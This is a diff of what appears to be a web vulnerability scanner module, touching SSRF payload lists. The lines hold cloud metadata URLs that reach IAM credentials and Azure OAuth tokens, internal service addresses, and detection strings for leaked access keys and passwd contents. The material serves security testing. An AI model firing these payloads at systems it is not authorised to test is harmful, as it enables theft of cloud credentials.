@@ -35,19 +35,15 @@ CLOUD_METADATA_PAYLOADS = [
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "http://169.254.169.254/latest/user-data",
     "http://169.254.169.254/latest/dynamic/instance-identity/document",
-    
     # GCP metadata
     "http://metadata.google.internal/computeMetadata/v1/",
     "http://metadata.google.internal/computeMetadata/v1/project/project-id",
     "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
-    
     # Azure metadata
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
-    
     # DigitalOcean metadata
     "http://169.254.169.254/metadata/v1/",
-    
     # Packet/Equinix metadata
     "http://metadata.packet.net/",
 ]
@@ -68,7 +64,6 @@ INTERNAL_SERVICES = [
     "http://127.0.0.1:27017",
     "http://127.0.0.1:9200",
     "http://127.0.0.1:11211",
-    
     # Internal network ranges
     "http://192.168.1.1",
     "http://192.168.0.1",
@@ -125,20 +120,16 @@ SSRF_SUCCESS_PATTERNS = [
     "security-credentials",
     "AccessKeyId",
     "SecretAccessKey",
-    
     # GCP
     "computeMetadata",
     "project-id",
-    
     # Azure
     "azEnvironment",
     "subscriptionId",
     "vmId",
-    
     # Internal file content (direct file read via SSRF)
     "root:x:0:0:",
     "[extensions]",
-    
     # Protocol-level service fingerprints (NOT product names — these appear in raw protocol output)
     # Note: "ssh-" matches SSH protocol banner (e.g. "SSH-2.0-OpenSSH")
     #       "220 " matches FTP/SMTP greeting
@@ -171,12 +162,12 @@ SSRF_ERROR_PATTERNS = [
 # and detect if the server reports connection-level errors
 SSRF_ERROR_PROBES = [
     # Non-routable IP (guaranteed to fail → should see connection error)
-    "http://127.0.0.1:1/",        # closed port → "Connection refused"
-    "http://127.0.0.1:62893/",    # random closed port
-    "http://[::1]:1/",            # IPv6 localhost closed port
-    "http://0.0.0.0:1/",          # invalid address
-    "http://192.0.2.1:80/",       # TEST-NET-1 (RFC 5737) — non-routable
-    "http://10.255.255.1:80/",    # likely unused in small labs
+    "http://127.0.0.1:1/",  # closed port → "Connection refused"
+    "http://127.0.0.1:62893/",  # random closed port
+    "http://[::1]:1/",  # IPv6 localhost closed port
+    "http://0.0.0.0:1/",  # invalid address
+    "http://192.0.2.1:80/",  # TEST-NET-1 (RFC 5737) — non-routable
+    "http://10.255.255.1:80/",  # likely unused in small labs
     # Hostnames that always fail DNS → "Name or service not known"
     "http://this-host-does-not-exist.invalid/",
     "http://ssrf-test-wvs-19.internal/",
@@ -214,15 +205,15 @@ SSRF_LIBRARY_ERRORS = [
 def build_ssrf_payloads(callback_host: str) -> dict:
     """
     Build SSRF payloads with callback host for OOB detection
-    
+
     Args:
         callback_host: Host for out-of-band callbacks (e.g., Burp Collaborator)
-    
+
     Returns:
         Dict with categorized payloads
     """
     token = generate_token()
-    
+
     return {
         "dns_bypass": [p.format(token=token) for p in DNS_BYPASS_PAYLOADS],
         "callback_host": callback_host,
